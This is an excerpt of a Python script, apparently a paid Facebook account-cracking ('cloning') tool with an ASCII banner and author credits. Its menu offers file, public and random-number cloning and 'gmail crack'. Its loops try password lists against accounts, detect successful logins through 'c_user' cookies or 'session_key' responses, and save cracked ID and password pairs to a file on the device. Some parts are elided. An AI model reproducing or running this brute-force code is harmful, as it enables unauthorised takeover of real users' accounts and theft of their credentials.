...
logo=("""\033[1;31m
                   ...
                   888  Y88b        888             888  Y88b \033[1;34m\033[1;37m
                   888   Y88b       888             888   Y88b\033[1;34mI\033[1;37m
                   888    Y88b      888             888    Y88b \033[1;34mS\033[1;37m                                              
\033[1;37m-----------------------------------------------------------------------
[~]Author  : ZAKARYIA KHAN 
[~]Github  : ithub.com/ZMuKhLS52
[~]Facebook: Z.MUKHLIS
[~]Tool    : PAID
[~]Version : 6.1
\033[1;37m-------------------------------------------------------------------------
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] FACEBOOK GRUOP (join)\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example of:  /sdcard/File.txt  etc..')
                                linex()
                                ...
                                os.system('xdg-open https://facebook.com/groups/245129077477605/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                menu()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Queen:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [KpK-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/KpK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [KpK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/KpK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [KpK-OK] '+uid+' | '+pas+'\033[1;97m')
